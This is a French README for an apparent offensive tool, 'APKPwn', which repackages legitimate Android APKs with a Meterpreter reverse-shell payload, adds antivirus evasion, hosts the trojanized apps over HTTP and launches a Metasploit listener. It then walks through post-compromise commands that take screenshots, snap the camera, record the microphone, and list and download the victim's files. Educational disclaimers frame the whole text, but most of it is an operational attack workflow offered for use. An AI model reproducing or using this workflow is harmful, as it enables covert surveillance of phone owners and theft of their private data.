# APKPwn - Android AV Evasion & Payload Injection Tool

APKPwn est un outil de sensibilisation à la cybersécurité qui permet de générer des APK infectées avec un payload **Meterpreter**. Cet outil est conçu dans un cadre éducatif pour démontrer les risques d'une mauvaise gestion des applications mobiles, en particulier l'installation de logiciels non fiables.

> **⚠️ IMPORTANT :**
> Ce projet est à but éducatif et de sensibilisation. Toute utilisation malveillante de cet outil est strictement interdite. **N'utilisez jamais les APK générées dans un environnement réel ou sans consentement explicite**. L'outil est conçu pour des environnements de tests sécurisés.

## Caractéristiques
- Génération de payloads Android avec `msfvenom`.
- Évasion AV pour des tests sur des applications Android.
- Signatures APK intégrées.
- Serveur HTTP intégré pour héberger et servir les APK malveillantes.

## Prérequis

- Système Linux (testé sur Ubuntu/Debian).
- Metasploit Framework installé.
- Les dépendances suivantes doivent être présentes :
  - `apktool`
  - `openjdk-11-jdk`
  - `apksigner`
  - `zipalign`
  
Si les dépendances ne sont pas installées, l'outil les installera automatiquement.

## Installation

1. Clonez le dépôt sur votre machine :

    ```bash
    git clone https://github.com/votre-utilisateur/APKPwn.git
    cd APKPwn
    ```

2. Installez les dépendances :

    L'outil vérifiera les dépendances nécessaires et vous proposera de les installer si elles ne sont pas disponibles.

    ```bash
    python3 apkpwn.py
    ```

3. Lancer l'outil :

    ```bash
    python3 apkpwn.py
    ```

    Suivez les instructions à l'écran pour choisir le payload, définir les options d'hôte et de port, et créer l'APK infectée.

## Utilisation

### Étape 1 : Création de l'APK infectée

Une fois l'outil lancé, vous devrez fournir les informations suivantes :
- **LHOST** : L'adresse IP de votre machine (l'outil la détecte automatiquement).
- **LPORT** : Le port sur lequel Metasploit écoutera les connexions.
- **Original APK** : Chemin vers une APK légitime que vous souhaitez utiliser pour injecter le payload.
- **Output APK** : Nom de l'APK malveillante qui sera générée.

### Étape 2 : Lancer Metasploit et attendre la connexion

L'outil générera un fichier `meterpreter_handler.rc` pour faciliter le démarrage du listener Metasploit :

    msfconsole -r meterpreter_handler.rc

Cela lancera un handler qui attendra une connexion de l'APK infectée.

### Étape 3 : Démarrage du serveur HTTP

Une fois l'APK malveillante générée, l'outil démarre un serveur HTTP sur votre machine pour que l'APK soit accessible via un lien :

    http://votre-ip:8000/votre_apk_malveillante.apk

Le but est de sensibiliser les utilisateurs aux dangers des APK téléchargées sur des sites non officiels.

### Étape 4 : Ouvrir une session Meterpreter

Lorsque l'utilisateur installe et exécute l'APK infectée sur son appareil, une session Meterpreter s'ouvrira. Vous pouvez alors interagir avec l'appareil compromis.

    meterpreter > sessions -i [ID de la session]

## Scénario de Sensibilisation

Voici un scénario de sensibilisation typique pour une session Meterpreter ouverte sur un appareil Android.

### 1. **Prendre une capture d'écran :**

Cela démontre comment un attaquant peut visualiser l'écran de l'utilisateur :

    meterpreter > screenshot

### 2. **Récupérer des informations sur l'appareil :**

Pour montrer la quantité d'informations accessibles à l'attaquant :

    meterpreter > sysinfo

### 3. **Vérifier si l'appareil est rooté :**

Montre comment l'attaquant peut vérifier si l'appareil a des permissions root :

    meterpreter > check_root

### 4. **Activer la caméra et prendre une photo :**

Un exemple frappant de la compromission de la vie privée :

    meterpreter > webcam_snap

### 5. **Activer le microphone et enregistrer de l'audio :**

Démontre comment l'attaquant peut enregistrer l'environnement sonore :

    meterpreter > record_mic

### 6. **Récupérer les fichiers de l'appareil :**

Montre que toutes les données de l'utilisateur peuvent être exfiltrées :

    meterpreter > ls /sdcard/
    meterpreter > download /sdcard/DCIM/photo.jpg

## Disclaimer

**APKPwn est strictement destiné à des fins éducatives et de sensibilisation.** Utilisez cet outil uniquement dans des environnements contrôlés avec l'autorisation de toutes les parties impliquées. L'utilisation malveillante peut entraîner des sanctions légales graves.

## Contributions

Les contributions sont les bienvenues ! Si vous souhaitez améliorer l'outil, n'hésitez pas à soumettre une Pull Request.

## License

Ce projet est sous licence MIT - consultez le fichier [LICENSE](LICENSE) pour plus de détails.
